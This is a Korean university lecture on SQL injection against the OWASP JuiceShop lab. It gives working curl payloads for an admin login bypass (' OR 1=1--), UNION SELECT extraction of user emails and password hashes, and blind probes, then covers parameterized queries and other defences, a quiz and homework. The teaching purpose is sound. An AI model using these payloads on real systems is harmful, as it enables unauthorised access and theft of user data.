# Week 04: OWASP Top 10 (1) - SQL Injection

## 학습 목표
- SQL의 기본 문법(SELECT, WHERE, UNION)을 이해한다
- SQL Injection의 원리와 유형을 파악한다
- JuiceShop에서 실제 SQL Injection 공격을 수행한다
- SQL Injection 방어 기법을 이해한다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (이 과목에서 자주 나오는 용어)

> 대학 1~2학년이 처음 접할 수 있는 보안/IT 용어를 정리한다.
> 강의 중 모르는 용어가 나오면 이 표를 참고하라.

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **페이로드** | Payload | 공격에 사용되는 실제 데이터/코드. 예: `' OR 1=1--` | 미사일의 탄두 |
| **익스플로잇** | Exploit | 취약점을 악용하는 기법 또는 코드 | 열쇠 없이 문을 여는 방법 |
| **셸** | Shell | 운영체제와 사용자를 연결하는 명령어 해석기 (bash, sh 등) | OS에게 말 걸 수 있는 창구 |
| **리버스 셸** | Reverse Shell | 대상 서버가 공격자에게 역방향 연결을 맺는 것 | 도둑이 집에서 밖으로 전화를 거는 것 |
| **포트** | Port | 서버에서 특정 서비스를 식별하는 번호 (0~65535) | 아파트 호수 |
| **데몬** | Daemon | 백그라운드에서 실행되는 서비스 프로그램 | 24시간 근무하는 경비원 |
| **패킷** | Packet | 네트워크로 전송되는 데이터의 단위 | 택배 상자 하나 |
| **프록시** | Proxy | 클라이언트와 서버 사이에서 중개하는 서버 | 대리인, 중간 거래자 |
| **해시** | Hash | 임의 길이 데이터를 고정 길이 값으로 변환하는 함수 (SHA-256 등) | 지문 (고유하지만 원본 복원 불가) |
| **토큰** | Token | 인증 정보를 담은 문자열 (JWT, API Key 등) | 놀이공원 입장권 |
| **JWT** | JSON Web Token | Base64로 인코딩된 JSON 기반 인증 토큰 | 이름·권한이 적힌 입장권 |
| **Base64** | Base64 | 바이너리 데이터를 텍스트로 인코딩하는 방법 | 암호가 아닌 "포장" (누구나 풀 수 있음) |
| **CORS** | Cross-Origin Resource Sharing | 다른 도메인에서의 API 호출 허용 설정 | "외부인 출입 허용" 표지판 |
| **API** | Application Programming Interface | 프로그램 간 통신 규약 | 식당의 메뉴판 (주문 양식) |
| **REST** | Representational State Transfer | URL + HTTP 메서드로 자원을 조작하는 API 스타일 | 도서관 대출 시스템 (책 이름으로 검색/대출/반납) |
| **SSH** | Secure Shell | 원격 서버에 안전하게 접속하는 프로토콜 | 암호화된 전화선 |
| **sudo** | SuperUser DO | 관리자(root) 권한으로 명령 실행 | "사장님 권한으로 실행" |
| **SUID** | Set User ID | 실행 시 파일 소유자 권한으로 실행되는 특수 권한 | 다른 사람의 사원증을 빌려 출입 |
| **IPS** | Intrusion Prevention System | 네트워크 침입 방지 시스템 (악성 트래픽 차단) | 공항 보안 검색대 |
| **SIEM** | Security Information and Event Management | 보안 로그를 수집·분석하는 통합 관제 시스템 | CCTV 관제실 |
| **WAF** | Web Application Firewall | 웹 공격을 탐지·차단하는 방화벽 | 웹사이트 전용 경비원 |
| **nftables** | nftables | Linux 커널 방화벽 프레임워크 (iptables 후계) | 건물 출입구 차단기 |
| **Suricata** | Suricata | 오픈소스 IDS/IPS 엔진 | 공항 X-ray 검색기 |
| **Wazuh** | Wazuh | 오픈소스 SIEM 플랫폼 | CCTV + AI 관제 시스템 |
| **ATT&CK** | MITRE ATT&CK | 실제 공격 전술·기법을 분류한 데이터베이스 | 범죄 수법 백과사전 |
| **OWASP** | Open Web Application Security Project | 웹 보안 취약점 연구 국제 단체 | 웹 보안의 표준 기관 |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 (0~10점) | 질병 위험도 등급 |
| **CVE** | Common Vulnerabilities and Exposures | 취약점 고유 식별 번호 | 질병의 고유 코드 (예: COVID-19) |
| **OpsClaw** | OpsClaw | 보안 작업 자동화·증적 관리 플랫폼 (이 수업에서 사용) | 보안 작업 일지 + 자동화 시스템 |


---

# Week 04: OWASP Top 10 (1) - SQL Injection

## 학습 목표

- SQL의 기본 문법(SELECT, WHERE, UNION)을 이해한다
- SQL Injection의 원리와 유형을 파악한다
- JuiceShop에서 실제 SQL Injection 공격을 수행한다
- SQL Injection 방어 기법을 이해한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| opsclaw | 10.20.30.201 | 실습 기지 |
| web | 10.20.30.80 | JuiceShop:3000 |

---

## 1. OWASP Top 10이란?

OWASP(Open Web Application Security Project)는 웹 애플리케이션 보안을 위한 국제 비영리 단체다. **OWASP Top 10**은 가장 치명적인 웹 보안 위협 10가지를 정리한 목록이다.

### OWASP Top 10 (2021)

| 순위 | 위협 | 이번 강의 |
|------|------|-----------|
| A01 | Broken Access Control | Week 06 |
| A02 | Cryptographic Failures | - |
| A03 | **Injection (SQL, XSS 등)** | **Week 04, 05** |
| A04 | Insecure Design | - |
| A05 | Security Misconfiguration | Week 07 |
| A06 | Vulnerable Components | - |
| A07 | Authentication Failures | Week 06 |
| A08 | Software and Data Integrity | - |
| A09 | Logging & Monitoring Failures | - |
| A10 | Server-Side Request Forgery | Week 07 |

---

## 2. SQL 기초

SQL(Structured Query Language)은 데이터베이스를 조작하는 언어다. SQL Injection을 이해하려면 SQL 기본 문법을 알아야 한다.

### 2.1 기본 문법

```sql
-- 테이블에서 모든 데이터 조회
SELECT * FROM Users;

-- 조건부 조회
SELECT * FROM Users WHERE email = 'admin@juice-sh.op';

-- 여러 조건 (AND, OR)
SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = '1234';

-- 결과 합치기 (UNION)
SELECT id, email FROM Users
UNION
SELECT id, name FROM Products;

-- 주석 (뒷부분 무시)
SELECT * FROM Users WHERE email = 'admin' -- 이 뒤는 무시됨
SELECT * FROM Users WHERE email = 'admin' /* 블록 주석 */
```

### 2.2 로그인 쿼리의 동작

일반적인 웹 애플리케이션의 로그인 처리:

```
사용자 입력: email = "admin@juice-sh.op", password = "mypassword"

서버가 실행하는 SQL:
SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = 'mypassword'
```

결과가 있으면 로그인 성공, 없으면 실패.

---

## 3. SQL Injection이란?

SQL Injection(SQLi)은 사용자 입력이 SQL 쿼리에 **그대로** 삽입될 때 발생한다. 공격자가 입력에 SQL 구문을 넣어서 쿼리의 의미를 변경한다.

### 3.1 원리

**정상적인 경우:**
```
입력: email = "admin@juice-sh.op"
쿼리: SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = '...'
```

**공격자의 입력:**
```
입력: email = "' OR 1=1--"
쿼리: SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...'
```

쿼리를 분석해보자:
- `email = ''` → 빈 문자열과 비교 (거짓)
- `OR 1=1` → 항상 참
- `--` → SQL 주석, 뒤의 `AND password = '...'` 부분을 무시

결과: **모든 사용자가 반환됨** → 첫 번째 사용자(보통 admin)로 로그인 성공!

### 3.2 왜 위험한가?

SQL Injection으로 할 수 있는 것:
- **인증 우회**: 비밀번호 없이 로그인
- **데이터 탈취**: 전체 데이터베이스 내용 읽기
- **데이터 변조**: 데이터 수정/삭제
- **서버 장악**: 일부 DB에서는 OS 명령 실행 가능

---

## 4. SQL Injection 유형

### 4.1 Error-based SQLi

SQL 오류 메시지를 통해 정보를 추출한다.

> **이 실습을 왜 하는가?**
> Error-based SQLi는 가장 쉬운 SQLi 유형이다. 서버가 에러 메시지를 그대로 반환하면,
> 공격자는 DB 종류, 테이블 구조, 데이터를 에러 메시지에서 직접 읽을 수 있다.
> 이 실습에서는 단순히 따옴표(`'`) 하나를 보내서 SQL 구문 에러를 유발하고,
> 에러 메시지에서 DB 기술 스택 정보를 추출하는 방법을 배운다.
>
> **실무 시나리오:** 모의해킹에서 로그인 폼이나 검색창에 `'`를 입력하는 것은
> SQLi 취약점 존재 여부를 확인하는 가장 기본적인 테스트이다.
> 500 에러가 반환되면 → SQLi 가능성이 높다.
> 200이 반환되면 → 입력값 검증이 잘 되어 있거나, 에러를 숨기고 있다.

> **실습 목적**: SQL Injection 취약점의 존재 여부를 확인하는 기본 테스트를 수행한다
>
> **배우는 것**: 특수문자 입력으로 SQL 구문 에러를 유발하여 DB 기술 스택과 SQLi 가능성을 판별하는 방법을 배운다
>
> **결과 해석**: 500 에러와 SQL 에러 메시지가 반환되면 SQLi 취약점이 존재할 가능성이 높고, 200 반환 시 입력값 검증이 동작 중이다
>
> **실전 활용**: 웹 애플리케이션 침투 테스트에서 로그인 폼과 검색창의 SQLi 취약점을 1차 스크리닝하는 표준 절차이다

```bash
# 따옴표 하나로 SQL 에러 유발
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\''","password":"test"}'
# 500 에러와 함께 스택 트레이스 반환 (검증 완료)
```

**예상 출력:** (HTML 에러 페이지)
```
OWASP Juice Shop (Express ^4.22.1)
500 Error
  at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)
  at /juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50
  ...
```

> **분석**: 에러 페이지에서 다음 정보를 추출할 수 있다:
> - **Express ^4.22.1** → Node.js Express 프레임워크 버전
> - **sequelize/lib/dialects/sqlite** → SQLite 데이터베이스, Sequelize ORM 사용
> - **/juice-shop/** → 앱 설치 경로
> 이 정보만으로 공격자는 DB 종류(SQLite)와 프레임워크를 파악하여 공격을 최적화할 수 있다.
> 실무에서는 이런 에러 정보가 외부에 노출되지 않도록 커스텀 에러 페이지를 설정한다.

### 4.2 UNION-based SQLi

UNION SELECT를 사용하여 다른 테이블의 데이터를 추출한다.

```bash
# JuiceShop 검색 기능에 UNION 공격
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+1,2,3,4,5,6,7,8,9--" \
  | python3 -m json.tool
```

> UNION 공격이 성공하려면 원래 쿼리의 컬럼 수를 맞춰야 한다.

### 4.3 Blind SQLi

결과가 직접 보이지 않을 때, 참/거짓 응답의 차이로 정보를 추출한다.

```bash
# Boolean-based blind: 참일 때와 거짓일 때 응답이 다름
# 참인 조건
curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+1=1--" | wc -c
# 거짓인 조건
curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+1=2--" | wc -c
```

### 4.4 Time-based Blind SQLi

응답 시간의 차이로 정보를 추출한다.

```bash
# SQLite에서는 다른 방법 사용 (예시 개념)
# 참이면 응답이 느림, 거짓이면 빠름
time curl -s "http://10.20.30.80:3000/rest/products/search?q=test" > /dev/null
```

---

## 5. 실습: JuiceShop SQL Injection 공격

### 5.1 Challenge: Admin Login (관리자 로그인 우회)

> **이 실습을 왜 하는가?**
> SQL Injection으로 **비밀번호 없이 관리자로 로그인**하는 것은 모의해킹에서 가장 극적인 발견이다.
> 실제 보안 사고에서도 SQLi를 통한 인증 우회는 빈번하게 발생한다.
> - 2020년: 한 한국 대형 쇼핑몰에서 SQLi로 100만 건 개인정보 유출
> - 2024년: MOVEit 파일 전송 서비스 SQLi로 글로벌 대규모 데이터 유출
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 단 한 줄의 입력(`' OR 1=1--`)으로 인증을 완전히 우회할 수 있음
> - SQL 쿼리의 논리를 조작하여 항상 참이 되는 조건을 만들 수 있음
> - 관리자 JWT 토큰을 획득하면 모든 API에 접근 가능
>
> **주의:** 이 기법은 **허가된 실습 환경에서만** 사용한다. 실제 서비스에 시도하면 **불법**이다.
>
> **실습 방법:**
> 1. 먼저 정상 로그인이 실패하는 것을 확인 (baseline)
> 2. SQLi 페이로드로 로그인 우회
> 3. 획득한 JWT를 디코딩하여 admin 권한 확인
> 4. admin 토큰으로 관리자 API 접근

JuiceShop의 가장 유명한 SQLi 챌린지다. 비밀번호 없이 admin 계정으로 로그인한다.

**Step 1: 정상 로그인 시도**

```bash
# 틀린 비밀번호로 로그인 시도
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrong"}' \
  | python3 -m json.tool
```

**예상 출력:**
```json
{
    "error": "Invalid email or password."
}
```

**Step 2: SQL Injection으로 로그인 우회**

```bash
# ' OR 1=1-- 를 이메일 필드에 삽입
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}' \
  | python3 -m json.tool
```

**예상 출력:**
```json
{
    "authentication": {
        "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
        "bid": 1,
        "umail": "admin@juice-sh.op"
    }
}
```

> **성공!** 비밀번호 없이 admin 계정으로 로그인했다. `OR 1=1`이 모든 행을 반환하게 만들어서, 첫 번째 사용자(admin)로 로그인된 것이다.

**Step 3: 얻은 JWT 토큰 분석**

```bash
# 토큰 저장
ADMIN_TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

echo "Admin Token: $ADMIN_TOKEN"

# JWT 페이로드 디코딩
echo "$ADMIN_TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
payload = sys.stdin.read().strip()
payload += '=' * (4 - len(payload) % 4)
decoded = base64.urlsafe_b64decode(payload)
print(json.dumps(json.loads(decoded), indent=2, ensure_ascii=False))
"
```

**예상 출력:**
```json
{
  "status": "success",
  "data": {
    "id": 1,
    "username": "",
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin",
    "isActive": true,
    "createdAt": "2026-03-25 01:13:41.120 +00:00"
  },
  "iat": 1774623850
}
```

> **주의!** JWT 페이로드에 **패스워드 해시**(`0192023a7bbd73250516f069df18b500`)까지 포함되어 있다.
> 이것은 JuiceShop의 의도적 취약점이다. 실무에서 JWT에 패스워드를 넣으면 심각한 보안 사고이다.
> 이 해시는 MD5이며, 크래킹하면 원래 비밀번호를 알 수 있다.
```

### 5.2 관리자 토큰으로 API 접근

```bash
# 관리자 전용 기능에 접근
# 전체 사용자 목록 조회
curl -s http://10.20.30.80:3000/api/Users/ \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | python3 -m json.tool

# 관리자 패널 접근
curl -s http://10.20.30.80:3000/administration \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -o /dev/null -w "%{http_code}\n"
```

### 5.3 특정 사용자로 로그인

`' OR 1=1--`은 첫 번째 사용자로 로그인한다. 특정 사용자를 지정할 수도 있다:

```bash
# admin 이메일을 직접 지정하고 비밀번호 검증 우회
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}' \
  | python3 -m json.tool
```

**쿼리 분석:**
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = '...'
```
- `admin@juice-sh.op'` → 이메일 지정
- `--` → 비밀번호 검증 부분을 주석 처리

### 5.4 검색 기능에서의 SQLi

```bash
# 정상 검색
curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" \
  | python3 -m json.tool | head -15

# SQLi로 모든 제품 표시
curl -s "http://10.20.30.80:3000/rest/products/search?q='+OR+1=1--" \
  | python3 -m json.tool | head -30
```

---

## 6. SQL Injection 심화: 데이터 추출

### 6.1 테이블 구조 파악

SQLite에서 테이블 목록을 조회하는 방법:

```bash
# UNION SELECT로 테이블 목록 추출 시도
# 컬럼 수를 맞춰야 하므로 여러 번 시도
curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--" \
  | python3 -m json.tool 2>/dev/null | head -30
```

> **참고**: JuiceShop의 검색 쿼리는 `SELECT * FROM Products WHERE ((name LIKE '%검색어%') OR (description LIKE '%검색어%'))` 형태이므로, 괄호를 닫아주어야 한다.

### 6.2 사용자 정보 추출

```bash
# 사용자 이메일과 비밀번호 해시 추출 시도
curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert'))+UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users--" \
  | python3 -m json.tool 2>/dev/null | head -40
```

---

## 7. SQL Injection 방어

> **방어를 왜 배우는가?**
> 공격만 알면 "스크립트 키디"에 불과하다. 보안 전문가는 공격을 이해하고 **방어 방안을 제시**해야 한다.
> 모의해킹 보고서의 "대응 방안" 섹션에는 반드시 구체적인 코드 수준의 수정 방법이 포함되어야 한다.
> "입력값을 검증하세요"라는 추상적 권고가 아니라, **매개변수화된 쿼리 코드 예시**를 첨부하는 것이 전문가이다.

### 7.1 매개변수화된 쿼리 (Parameterized Queries) — 가장 효과적인 방어

**취약한 코드 (절대 하지 말 것):**
```javascript
// 사용자 입력이 SQL에 직접 삽입됨 - 위험!
const query = "SELECT * FROM Users WHERE email = '" + userInput + "'";
db.query(query);
```

**안전한 코드:**
```javascript
// 매개변수화된 쿼리 - 입력이 데이터로만 처리됨
const query = "SELECT * FROM Users WHERE email = ?";
db.query(query, [userInput]);
```

매개변수화된 쿼리에서는 `' OR 1=1--`을 입력해도 문자열 데이터로만 취급된다:
```sql
-- 실제 실행되는 쿼리
SELECT * FROM Users WHERE email = ''' OR 1=1--'
-- → email이 "' OR 1=1--"인 사용자를 찾음 (당연히 없음)
```

### 7.2 ORM 사용

ORM(Object-Relational Mapping)은 SQL을 직접 작성하지 않고 프로그래밍 언어의 객체로 DB를 조작한다.

```javascript
// Sequelize ORM 사용 (자동으로 매개변수화)
const user = await User.findOne({
  where: { email: userInput }
});
```

### 7.3 입력 검증 (Input Validation)

```javascript
// 이메일 형식 검증
if (!/^[a-zA-Z0-9@._-]+$/.test(userInput)) {
  throw new Error("Invalid email format");
}
```

### 7.4 최소 권한 원칙

데이터베이스 사용자에게 필요한 최소한의 권한만 부여한다:
- 웹 앱용 DB 계정: SELECT, INSERT만 허용
- 관리자용 DB 계정: 모든 권한
- DROP, ALTER 같은 위험한 권한은 웹 앱에 부여하지 않음

### 7.5 에러 메시지 제한

상세한 SQL 에러를 사용자에게 보여주지 않는다:
- **나쁜 예**: "SQLITE_ERROR: unrecognized token at 'OR 1=1'"
- **좋은 예**: "로그인에 실패했습니다."

---

## 8. JuiceShop에서 탐지: Wazuh 연동

SQL Injection 공격이 발생하면 SIEM에서 탐지할 수 있다.

```bash
# siem 서버에서 Wazuh 알림 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5 | python3 -m json.tool" 2>/dev/null
```

> **참고**: JuiceShop의 접근 로그에 SQLi 패턴이 기록되면, Wazuh 규칙이 이를 탐지하여 알림을 생성한다.

---

## 9. OpsClaw로 SQLi 테스트 자동화

OpsClaw Manager API를 호출하여 작업을 수행합니다.

```bash
# SQLi 테스트 프로젝트 생성
PROJECT_ID=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"week04-sqli-test","request_text":"JuiceShop SQLi 취약점 점검","master_mode":"external"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

echo "Project ID: $PROJECT_ID"

# Stage 전환
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null     # API 인증 키
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null     # API 인증 키

# SQLi 테스트 실행
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{                                                # 요청 데이터(body)
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"'\\'' OR 1=1--\\\",\\\"password\\\":\\\"test\\\"}\"",
        "risk_level": "medium"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }'

# 결과 확인
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/projects/$PROJECT_ID/evidence/summary \
  | python3 -m json.tool
```

---

## 10. 실습 체크리스트

다음 항목을 모두 수행하라:

- [ ] JuiceShop 로그인 페이지에서 `' OR 1=1--`로 admin 로그인 성공
- [ ] 획득한 JWT 토큰을 디코딩하여 admin 정보 확인
- [ ] admin 토큰으로 `/api/Users/` API를 호출하여 전체 사용자 목록 조회
- [ ] 검색 기능에서 `' OR 1=1--`로 모든 제품 표시
- [ ] UNION SELECT를 사용하여 데이터 추출 시도
- [ ] 오류 메시지에서 데이터베이스 종류(SQLite) 확인

---

## 과제

1. JuiceShop의 로그인 API에 SQL Injection을 수행하여 admin으로 로그인하고, 획득한 JWT 토큰의 전체 내용을 디코딩하여 제출하라
2. 검색 API(`/rest/products/search`)에 UNION SELECT를 시도하여, Users 테이블의 이메일 목록을 추출하라 (힌트: 컬럼 수 9개)
3. "매개변수화된 쿼리"를 사용하면 SQL Injection이 왜 불가능해지는지 자신의 말로 설명하라
4. SQL Injection 공격이 SIEM(Wazuh)에서 어떻게 탐지될 수 있는지 논의하라

---

## 핵심 요약

- **SQL Injection**은 사용자 입력이 SQL 쿼리에 직접 삽입될 때 발생하는 취약점이다
- `' OR 1=1--`는 가장 기본적인 SQLi 페이로드로, 인증 우회에 사용된다
- SQLi 유형: Error-based, UNION-based, Blind (Boolean/Time-based)
- **방어**: 매개변수화된 쿼리, ORM, 입력 검증, 최소 권한, 에러 메시지 제한
- JuiceShop에서 실제 SQLi 공격을 통해 admin 권한을 획득할 수 있다

> **다음 주 예고**: Week 05에서는 OWASP Top 10의 또 다른 Injection 공격인 XSS(Cross-Site Scripting)를 배운다. JavaScript를 이용한 쿠키 탈취와 세션 하이재킹을 실습한다.


---


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** SQL Injection이 발생하는 근본 원인은?
- (a) 서버 성능 부족  (b) **사용자 입력이 SQL 쿼리에 그대로 삽입**  (c) 네트워크 지연  (d) 디스크 부족

**Q2.** `' OR 1=1--`에서 `--`의 역할은?
- (a) 문자열 연결  (b) 변수 선언  (c) **SQL 주석 (이후 무시)**  (d) 조건 추가

**Q3.** UNION SELECT 공격이 성공하려면 반드시 맞춰야 하는 것은?
- (a) 테이블 이름  (b) **원래 쿼리의 컬럼 수**  (c) DB 버전  (d) 사용자 권한

**Q4.** Blind SQLi에서 참/거짓을 구분하는 방법은?
- (a) 에러 메시지 확인  (b) **응답 내용이나 시간의 차이 관찰**  (c) 소스 코드 확인  (d) 서버 재시작

**Q5.** SQL Injection 방어의 가장 효과적인 방법은?
- (a) WAF 배치  (b) IP 차단  (c) **매개변수화된 쿼리(Prepared Statement)**  (d) HTTPS 적용

**Q6.** JuiceShop에서 SQLi로 획득한 JWT의 역할은?
- (a) 암호화 키  (b) **인증 토큰 (세션 대용)**  (c) DB 접속 정보  (d) API 문서

**Q7.** 에러 메시지에 "SQLITE_ERROR"가 나타나면 알 수 있는 것은?
- (a) 서버 OS  (b) **데이터베이스 종류 (SQLite)**  (c) 네트워크 구성  (d) 방화벽 설정

**Q8.** ORM(Object-Relational Mapping)이 SQLi를 방지하는 이유는?
- (a) SQL을 사용하지 않아서  (b) **자동으로 매개변수화하여 입력이 데이터로만 처리**  (c) 암호화해서  (d) 로그를 남겨서

**Q9.** OWASP Top 10에서 Injection은 몇 번인가?
- (a) A01  (b) A02  (c) **A03**  (d) A10

**Q10.** 입력값 `admin@juice-sh.op'--`로 로그인이 되는 이유는?
- (a) 비밀번호가 맞아서  (b) **`--`가 비밀번호 검증 부분을 주석 처리**  (c) 관리자 예외  (d) 세션이 남아서

**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:b, Q9:c, Q10:b

---
